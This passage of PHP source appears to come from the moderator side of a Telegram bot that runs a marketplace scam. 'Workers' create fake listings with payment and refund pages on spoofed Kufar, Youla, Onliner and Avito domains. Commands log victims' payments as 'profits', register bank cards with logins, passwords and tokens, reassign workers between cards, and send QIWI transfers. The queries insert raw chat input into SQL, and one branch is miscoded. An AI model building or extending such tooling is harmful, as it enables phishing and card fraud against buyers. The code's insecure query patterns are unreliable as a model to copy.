                            if ($row['type'] == 2) $type = 'Куфар 1.0' AND $url = 'https://' . $domains['kufar'] . '/buy?id=' . $row['advert_id'];
                            $text .= "<b>" . $x . ".</b> <a href=\"https://avito.ru/$row[advert_id]\">$row[title]</a> — <b>Сумма:</b> <code>$row[price] руб.</code> | <a href=\"tg://user?id=$row[worker]\">Воркер</a>\n<i>$type</i> <b>| Оплата:</b> <a href=\"$url\">$row[advert_id]</a> | <b>Переходов:</b> <code>$row[views]</code>\n";
                        }
                        send($config['token'], 'sendMessage', Array('chat_id' => $message['chat_id'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    } else {
                        send($config['token'], 'sendMessage', Array('chat_id' => $message['chat_id'], 'text' => getMyAdverts($worker['telegram'], 1), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => getMyAdverts($worker['telegram'], 1, 1)));
                    }
                }
            }
        }

        // ===================== [ ЧАТ МОДЕРАТОРОВ ] ===================== //

        if ($message['chat_id'] == $config['chat']['moders']) {
            $isAccess = mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `telegram` = '$message[from]' AND `access` >= '666'");

            if (mysqli_num_rows($isAccess) > 0) {
                if ($message['text'] == '/help') {
                    $text = "⚙️ <b>Основные команды</b>\n";
                    $text .= "/help — Показать список команд\n";
                    $text .= "/stats — Показать статистику проекта\n";
                    $text .= "/info <code>[Telegram ID] или [username]</code> — Показать информацию о воркере\n";
                    $text .= "/setdelivery <code>[Сумма]</code> — Установить сумму за доставку по умолчанию\n";
                    $text .= "/warn <code>[Telegram ID]</code> — выдать предупреждение воркеру\n";
                    $text .= "/unwarn <code>[Telegram ID]</code> — снять предупреждение воркеру\n";
                    $text .= "/ban <code>[Telegram ID]</code> — заблокировать воркера\n";
                    $text .= "/unban <code>[Telegram ID]</code> — разаблокировать воркера\n";
                    $text .= "/checkip <code>[IP адрес]</code> — информация об IP адресе\n";
                    $text .= "/stake <code>[Оплата];[Возврат]</code> — изменить ставку по умолчанию\n";
                    $text .= "/setstake <code>[Telegram ID];[Оплата];[Возврат]</code> — изменить ставку воркеру\n";
                    $text .= "/setbalance <code>[Telegram ID];[Сумма]</code> — изменить баланс воркеру\n";
                    $text .= "/minprice <code>[Сумма]</code> — изменить минимальную сумму объявления\n";
                    $text .= "/maxprice <code>[Сумма]</code> — изменить максимальную сумму объявления\n";
                    $text .= "/msg <code>[Telegram ID];[Текст сообщения]</code> — отправить сообщение\n";
                    $text .= "/say <code>[Текст сообщения]</code> — рассылка всем активным пользователям бота\n";
                    $text .= "\n🗂 <b>Работа с объявлениями</b>\n";
                    $text .= "/advert <code>[ID объявления]</code> — Подробная информация об объявлении\n";
                    $text .= "/adverts <code>[Telegram ID] или ничего</code> — 10 последних объявлений или объявления пользователя\n";
                    $text .= "/create <code>[Telegram ID];[ID объявления];[Название];[Цена]</code> — сгенерировать объявление\n";
                    $text .= "/settitle <code>[ID объявления];[Название товара]</code> — Изменить название объявления\n";
                    $text .= "/setimage <code>[ID объявления];[URL изображения]</code> — Изменить изображение объявления\n";
                    $text .= "/setprice <code>[ID объявления];[Сумма]</code> — Изменить сумму объявления\n";
                    $text .= "/deladvert <code>[ID объявления]</code> — скрыть объявление\n";
                    $text .= "/resadvert <code>[ID объявления]</code> — восстановить объявление\n";
                    $text .= "\n💳 <b>Работа с картами</b>\n";
                    $text .= "/cards — Показать информацию о картах\n";
                    $text .= "/setcard <code>[Telegram ID];[Карта]</code> — Установить карту воркеру\n";
                    $text .= "/addcard <code>[Логин]:[Пароль]:[Токен]:[Номер карты]</code> — Добавить карту\n";
                    $text .= "/delcard <code>[Номер карты]</code> — Удалить карту из списка\n";
                    $text .= "/changecard <code>[Текущая карта];[Новая карта]</code> — Перекинуть всех воркеров с одной карты на другую\n";
                    $text .= "/qiwipay <code>[Номер QIWI];[Получатель];[Сумма];[Комментарий]</code> — Перевести деньги на QIWI кошелёк\n";
                    $text .= "/defaultcard <code>[Номер карты]</code> — Сделать картой по умолчанию\n";

                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

                }

                if (preg_match('/^\/advert/i', $message['text']) == TRUE AND preg_match('/\/adverts/i', $message['text']) == FALSE) {
                    if (preg_match('/^\/advert ([a-z0-9]{24}|\d+)$/i', $message['text']) == TRUE) {
                        $advert_id = mb_substr($message['text'], 8);

                        $query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$advert_id'");

                        if (mysqli_num_rows($query) > 0) {
                            $advert = mysqli_fetch_assoc($query);

                            if ($advert['type'] == 0) $url = "https://kufar.de/$advert[advert_id]" AND $platform = 'Куфар 2.0';
                            if ($advert['type'] == 2) $url = "https://kufar.de/$advert[advert_id]" AND $platform = 'Куфар 1.0';

                            if ($advert['delivery'] == 0) $advert['delivery'] = $settings['delivery'];
                            if ($advert['status'] == -1) $status = 'Скрыто';
                            if ($advert['status'] == 0) $status = 'В обработке';
                            if ($advert['status'] == 1) $status = 'Активно';

                            $payments = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `advert_id` = '$advert_id' AND `status` = '1'"));

                            $text = "💼 <b>Информация об объявлении</b> <a href=\"$url\">$advert_id</a>\n\n";
                            $text .= "<b>Платформа:</b> <code>$platform</code>\n";
                            $text .= "<b>Название товара:</b> <code>$advert[title]</code>\n";
                            $text .= "<b>Сумма товара:</b> <code>$advert[price] руб.</code>\n";
                            $text .= "<b>Сумма доставки:</b> <code>$advert[delivery] руб.</code>\n";
                            $text .= "<b>Автор объявления:</b> <a href=\"tg://user?id=$advert[worker]\">$advert[worker]</a>\n";
                            $text .= "<b>Просмотров объявления:</b> <code>" . Endings($advert['views'], "просмотр", "просмотра", "просмоторв") . "</code>\n";
                            $text .= "<b>Статус:</b> <code>$status</code>\n";
                            $text .= "<b>Успешных профитов:</b> <code>$payments[count]</code>\n";
                            $text .= "<b>Общая сумма профита:</b> <code>" . number_format($payments['total']) . " руб.</code>\n";
                            $text .= "<b>Дата генерации:</b> <code>" . date("d.m.Y в H:i:s", $advert['time']) . "</code>\n";

                            if ($advert['type'] == 0) {
                                $keyboard = Array('inline_keyboard' => Array(Array(Array('text' => 'Страница оплаты', 'url' => 'https://' . $domains['onliner'] . '/buy?id=' . $advert['advert_id']), Array('text' => 'Страница возврата', 'url' => 'https://' . $domains['onliner'] . '/refund?id=' . $advert['advert_id']))));
                            } elseif ($advert['type'] == 1) {
                                $keyboard = Array('inline_keyboard' => Array(Array(Array('text' => 'Страница оплаты', 'url' => 'https://' . $domains['youla'] . '/product/' . $advert_id . '/buy/delivery'), Array('text' => 'Страница возврата', 'url' => 'https://' . $domains['youla'] . '/refund/' . $advert_id))));
                            } elseif ($advert['type'] == 2) {
                                $keyboard = Array('inline_keyboard' => Array(Array(Array('text' => 'Страница оплаты', 'url' => 'https://' . $domains['kufar'] . '/buy?id=' . $advert['advert_id']), Array('text' => 'Страница возврата', 'url' => 'https://' . $domains['kufar'] . '/pay/refund.php?id=' . $advert['advert_id']))));
                            } else {
                                $keyboard = Array('inline_keyboard' => Array(Array()));
                            }

                            if ($advert['status'] == -1) {
                                array_push($keyboard['inline_keyboard'], Array(Array('text' => 'Восстановить объявление', 'callback_data' => '/show/' . $advert_id . '/')));
                            } elseif ($advert['status'] > 0) {
                                array_push($keyboard['inline_keyboard'], Array(Array('text' => 'Скрыть объявление', 'callback_data' => '/hide/' . $advert_id . '/')));
                            }

                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
                        } else {
                            $text = "🔎 <b>Объявление с таким ID не было найдено</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                        }
                    } else {
                        $text = "❔ Используйте /advert <code>[ID объявления]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    }
                }

                if (preg_match('/\/resadvert/i', $message['text']) == TRUE) {
                    if (preg_match('/\/resadvert (.{24}|\d+)/i', $message['text']) == TRUE) {
                        $advert_id = mb_substr($message['text'], 11);

                        $query = mysqli_query($connection, "SELECT `type`, `worker`, `title`, `price`, `delivery` FROM `adverts` WHERE `advert_id` = '$advert_id' AND `status` = '-1'");

                        if (mysqli_num_rows($query) > 0) {
                            $advert = mysqli_fetch_assoc($query);
                            mysqli_query($connection, "UPDATE `adverts` SET `status` = '1', `time` = '" . time() . "' WHERE `advert_id` = '$advert_id'");

                            if ($advert['delivery'] == '0') $advert['delivery'] = $settings['delivery'];

                            $text = "📮 <b>Модератор восстановил ваше объявление</b> <code>$advert_id</code>\n\n";
                            $text .= "<b>Название товара:</b> <code>$advert[title]</code>\n";
                            $text .= "<b>Сумма товара:</b> <code>$advert[price] руб.</code>\n";
                            $text .= "<b>Сумма доставки:</b> <code>$advert[delivery] руб.</code>\n\n";
                            if ($advert['type'] == 0) {
                                $text .= "<b>Ссылка на оплату:</b> https://$domains[onliner]/buy?id=$advert_id\n";
                                $text .= "<b>Ссылка на возврат:</b> https://$domains[onliner]/refund?id=$advert_id\n";
                            } elseif ($advert['type'] == 1) {
                                $text .= "<b>Ссылка на оплату:</b> https://$domains[youla]/product/$advert_id/buy/delivery\n";
                                $text .= "<b>Ссылка на возврат:</b> https://$domains[youla]/refund/$advert_id/\n";
                            } elseif ($advert['type'] == 2) {
                                $text .= "<b>Ссылка на оплату:</b> https://$domains[kufar]/buy?id=$advert_id\n";
                                $text .= "<b>Ссылка на возврат:</b> https://pay.$domains[kufar]/refund.php?id=$advert_id\n";
                            }
                            send($config['token'], 'sendMessage', Array('chat_id' => $advert['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                            $text = "📮 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>восстановил объявление</b> <a href=\"tg://user?id=$advert[worker]\">воркера</a> <code>$advert_id</code>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                        } else {
                            $text = "🥴 <b>Объявление не существует или оно не скрыто</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                        }
                    } else {
                        $text = "❔ Используйте /resadvert <code>[ID объявления]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    }
                }

                if (preg_match('/\/deladvert/i', $message['text']) == TRUE) {
                    if (preg_match('/\/deladvert (.{24}|\d+)/i', $message['text']) == TRUE) {
                        $advert_id = mb_substr($message['text'], 11);

                        $query = mysqli_query($connection, "SELECT `worker` FROM `adverts` WHERE `advert_id` = '$advert_id' AND `status` >= '0'");

                        if (mysqli_num_rows($query) > 0) {
                            $advert = mysqli_fetch_assoc($query);
                            mysqli_query($connection, "UPDATE `adverts` SET `status` = '-1' WHERE `advert_id` = '$advert_id'");

                            $text = "🚮 <b>Модератор скрыл ваше объявление</b> <code>$advert_id</code>\n\n";
                            $text .= "Вы сможете восстановить его, отправив боту ссылку https://avito.ru/$advert_id";
                            $keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => '♻️ Восстановить', 'callback_data' => '/show/' . $advert_id . '/')))));
                            send($config['token'], 'sendMessage', Array('chat_id' => $advert['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
                            $text = "🚮 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>скрыл объявление</b> <a href=\"tg://user?id=$advert[worker]\">воркера</a> <code>$advert_id</code>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                        } else {
                            $text = "🥴 <b>Объявление не существует или уже неактивно</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                        }
                    } else {
                        $text = "❔ Используйте /deladvert <code>[ID объявления]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    }
                }

                if (preg_match('/\/setimage/i', $message['text']) == TRUE) {
                    if (preg_match('/\/setimage (.{24}|\d+);.+/i', $message['text']) == TRUE) {
                        $edit = explode(';', mb_substr($message['text'], 10));

                        if (preg_match('/(http|https):\/\/cache\d.youla.io\/files\/images\/.+.jpg/i', $edit[1]) == TRUE OR preg_match('/(http|https):\/\/\d{1,3}.img.avito.st\/\d{3,4}x\d{3,4}\/\d+.jpg/i', $edit[1]) == TRUE OR preg_match('/(http|https):\/\/i.imgur.com\/.+.jpg/i', $edit[1]) == TRUE) {
                            $query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$edit[0]' AND `status` = '1'");

                            if (mysqli_num_rows($query) > 0) {
                                $advert = mysqli_fetch_assoc($query);

                                mysqli_query($connection, "UPDATE `adverts` SET `image` = '$edit[1]' WHERE `advert_id` = '$edit[0]'");
                                $text = "💶 <b>Модератор изменил вам изображение на объявлении</b> <code>$edit[0]</code> <b>на</b> $edit[1]";
                                send($config['token'], 'sendMessage', Array('chat_id' => $advert['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                                $text = "💶 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил изображение на объявлении</b> <a href=\"tg://user?id=$advert[worker]\">воркера</a> <code>$edit[0]</code> <b>на</b> $edit[1]";
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			
                            } else {
                                $text = "📬 <b>Объявление с таким ID не было найдено или уже неактивно</b>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			
                            }
                        } else {
                            $text = "🏞 <b>Ссылка на изображение указана некорректна</b>\n\n";
                            $text .= "Скопируйте первое изображение из своего объявления на Авито или воспользуйтесь ботом для загрузки изображений @imgurplusbot";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                        }
                    } else {
                        $text = "❔ Используйте /setimage <code>[ID объявления];[URL изображения]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    }
                }

                if (preg_match('/\/settitle/i', $message['text']) == TRUE) {
                    if (preg_match('/\/settitle (.{24}|\d+);.+/i', $message['text']) == TRUE) {
                        $edit = explode(';', mb_substr($message['text'], 10));

                        if (mb_strlen($edit[1]) < 101) {
                            $query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$edit[0]' AND `status` = '1'");

                            if (mysqli_num_rows($query) > 0) {
                                $advert = mysqli_fetch_assoc($query);

                                mysqli_query($connection, "UPDATE `adverts` SET `title` = '$edit[1]' WHERE `advert_id` = '$edit[0]'");
                                $text = "💶 <b>Модератор изменил вам название объявления</b> <code>$edit[0]</code> <b>с</b> <code>$advert[title]</code> <b>до</b> <code>$edit[1]</code>\n\n";

                                if ($advert['type'] == 0) {
                                    $text .= "<b>Оплата:</b> https://$domains[onliner]/buy?id=$edit[0]\n";
                                    $text .= "<b>Возврат:</b> https://$domains[onliner]/refund?id=$edit[0]";
                                } elseif ($advert['type'] == 1) {
                                    $text .= "<b>Оплата:</b> https://$domains[youla]/product/$edit[0]/buy/delivery\n";
                                    $text .= "<b>Возврат:</b> https://$domains[youla]/refund/$edit[0]/\n";
                                } elseif ($advert['type'] == 0) {
                                    $text .= "<b>Оплата:</b> https://$domains[kufar]/buy?id=$edit[0]\n";
                                    $text .= "<b>Возврат:</b> https://pay.$domains[kufar]/refund.php?id=$edit[0]";
                                }

                                send($config['token'], 'sendMessage', Array('chat_id' => $advert['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                                $text = "💶 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил название объявления</b> <a href=\"tg://user?id=$advert[worker]\">воркера</a> <code>$edit[0]</code> <b>с</b> <code>$advert[title]</code> <b>на</b> <code>$edit[1]</code>";  /*LICENSE KEY: EMPTY*/
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			
                            } else {
                                $text = "📬 <b>Объявление с таким ID не было найдено или уже неактивно</b>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			
                            }
                        } else {
                            $text = "️🚫 <b>Название объявления не может быть длиннее 100 символов</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                        }
                    } else {
                        $text = "❔ Используйте /settitle <code>[ID объявления];[Название товара]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    }
                }

                if (preg_match('/\/setprice/i', $message['text']) == TRUE) {
                    if (preg_match('/\/setprice (.{24}|\d+);\d{3,5}/i', $message['text']) == TRUE) {
                        $edit = explode(';', mb_substr($message['text'], 10));

                        if ($edit[1] >= $settings['min_price'] AND $edit[1] <= $settings['max_price']) {
                            $query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$edit[0]' AND `status` = '1'");

                            if (mysqli_num_rows($query) > 0) {
                                $advert = mysqli_fetch_assoc($query);

                                mysqli_query($connection, "UPDATE `adverts` SET `price` = '$edit[1]' WHERE `advert_id` = '$edit[0]'");

                                $text = "💶 <b>Модератор изменил вам цену для объявления</b> <code>$edit[0]</code> <b>с</b> <code>$advert[price] руб.</code> <b>до</b> <code>$edit[1] руб.</code>\n\n";
                                if ($advert['type'] == 0) {
                                    $text .= "<b>Оплата:</b> https://$domains[onliner]/buy?id=$edit[0]\n";
                                    $text .= "<b>Возврат:</b> https://$domains[onliner]/refund?id=$edit[0]";
                                } elseif ($advert['type'] == 1) {
                                    $text .= "<b>Оплата:</b> https://$domains[youla]/product/$edit[0]/buy/delivery\n";
                                    $text .= "<b>Возврат:</b> https://$domains[youla]/refund/$edit[0]/\n";
                                } elseif ($advert['type'] == 2) {
                                    $text .= "<b>Оплата:</b> https://$domains[kufar]/buy?id=$edit[0]\n";
                                    $text .= "<b>Возврат:</b> https://pay.$domains[kufar]/refund.php?id=$edit[0]";
                                }

                                send($config['token'], 'sendMessage', Array('chat_id' => $advert['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                                $text = "💶 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил сумму объявления</b> <a href=\"tg://user?id=$advert[worker]\">воркера</a> <code>$edit[0]</code> <b>с</b> <code>$advert[price] руб.</code> <b>на</b> <code>$edit[1] руб.</code>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                            } else {
                                $text = "📬 <b>Объявление с таким ID не было найдено или уже неактивно</b>";
                            }
                        } else {
                            $text = "🚫 <b>Сумма товара не может быть больше $settings[max_price] руб. и меньше $settings[min_price] руб.</b>";
                        }

                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    } else {
                        $text = "❔ Используйте /setprice <code>[ID объявления];[Сумма товара]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    }
                }

                if (preg_match('/\/addcard/i', $message['text']) == TRUE) {
                    if (preg_match('/\/addcard (\d+|[0-9a-z@.]+|0):(.+|0):(.{32}|0):\d{16}/i', $message['text']) == TRUE) {
                        $card = explode(':', mb_substr($message['text'], 9));

                        $search = mysqli_query($connection, "SELECT `id` FROM `cards` WHERE `number` = '$card[3]'");
                        if (mysqli_num_rows($search) <= 0) {
                            mysqli_query($connection, "INSERT INTO `cards` (`login`, `password`, `amount`, `totalAmount`, `token`, `number`, `exp`, `cvv`, `status`, `blocked`, `verify`, `lastCheck`, `added`) VALUES ('$card[0]', '$card[1]', '0', '0', '$card[2]', '$card[3]', '0', '0', '1', '0', '0', '0', '" . time() . "')");
                            $text = "💳 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>добавил карту</b> <code>$card[3]</code>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        } else {
                            $text = "🚧 <b>Данная карта уже добавлена</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                        }
                    } else {
                        $text = "❔ Используйте /addcard <code>[Логин]:[Пароль]:[Токен]:[Номер карты]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    }
                }

                if (preg_match('/\/delcard/i', $message['text']) == TRUE) {
                    if (preg_match('/\/delcard \d+/i', $message['text']) == TRUE) {
                        $card = mb_substr($message['text'], 9);

                        $query = mysqli_query($connection, "SELECT * FROM `cards` WHERE `number` ='$card'");

                        if (mysqli_num_rows($query) > 0) {
                            if ($settings['card'] == $card) {
                                mysqli_query($connection, "UPDATE `config` SET `card` = '0' WHERE `card` = '$card'");
                            }

                            mysqli_query($connection, "UPDATE `cards` SET `status` = '0' WHERE `number` = '$card'");
                            mysqli_query($connection, "UPDATE `accounts` SET `card` = '0' WHERE `card` = '$card'");
                            $text = "🏦 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>удалил карту</b> <code>$card</code>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        } else {
                            $text = "🏦 <b>Карта была не найдена</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                        }
                    } else {
                        $text = "❔ Используйте /delcard <code>[Номер карта]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    }
                }

                if (preg_match('/\/changecard/i', $message['text']) == TRUE) {
                    if (preg_match('/\/changecard \d+;\d+/i', $message['text']) == TRUE) {
                        $card = explode(';', mb_substr($message['text'], 12));

                        $query = mysqli_query($connection, "SELECT * FROM `cards` WHERE `number` ='$card[0]'");
                        $query1 = mysqli_query($connection, "SELECT * FROM `cards` WHERE `number` ='$card[1]'");

                        if (mysqli_num_rows($query) > 0 AND mysqli_num_rows($query1) > 0) {
                            mysqli_query($connection, "UPDATE `accounts` SET `card` = '$card[1]' WHERE `card` = '$card[0]'");
                            $text = "🏦 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>сменил карту с</b> <code>$card[0]</code> <b>на</b> <code>$card[1]</code>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        } else {
                            $text = "🏦 <b>Не найдена карта #1 или #2</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                        }
                    } else {
                        $text = "❔ Используйте /changecard <code>[Номер карта 1];[Номер карта 2]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    }
                }

                if (preg_match('/\/setdelivery/i', $message['text']) == TRUE) {
                    if (preg_match('/\/setdelivery \d{1,4}/i', $message['text']) == TRUE) {
                        $amount = substr($message['text'], 13);

                        mysqli_query($connection, "UPDATE `config` SET `delivery` = '$amount'");

                        $text = "🔑 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>установил сумму за доставку в </b> <code>$amount RUB</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                        $text = "🔑 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>установил сумму за доставку в </b> <code>$amount RUB</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    } else {
                        $text = "❔ Используйте /setdelivery <code>[Сумма]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    }
                }

                if (preg_match('/\/unwarn/i', $message['text']) == TRUE) {
                    if (preg_match('/\/unwarn \d+/i', $message['text']) == TRUE) {
                        $user_id = mb_substr($message['text'], 8);

                        $query = mysqli_query($connection, "SELECT `warns` FROM `accounts` WHERE `telegram` = '$user_id'");

                        if (mysqli_num_rows($query) > 0) {
                            $user = mysqli_fetch_assoc($query);

                            if ($user['warns'] > 0) {
                                mysqli_query($connection, "UPDATE `accounts` SET `warns` = `warns`-1 WHERE `telegram` = '$user_id'");
                                $text = "⚠️ <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>снял предупреждение с</b> <a href=\"tg://user?id=$user_id\">воркера</a> <code>[" . ($user['warns'] - 1) . "/3]</code>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                                $text = "⚠️ <b>Модератор снял вам предупреждение</b> <code>[" . ($user['warns'] - 1) . "/3]</code>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $user_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                            } else {
                                $text = "⚠️ <b>У</b> <a href=\"tg://user?id=$user_id\">воркера</a> нет предупреждений</b>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			
                            }
                        } else {
                            $text = "⚠️ <b>Воркер с таким ID не найден</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                        }
                    } else {
                        $text = "❔ Используйте /unwarn <code>[Telegram ID]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    }
                }


                if (preg_match('/^\/warn/i', $message['text']) == TRUE) {
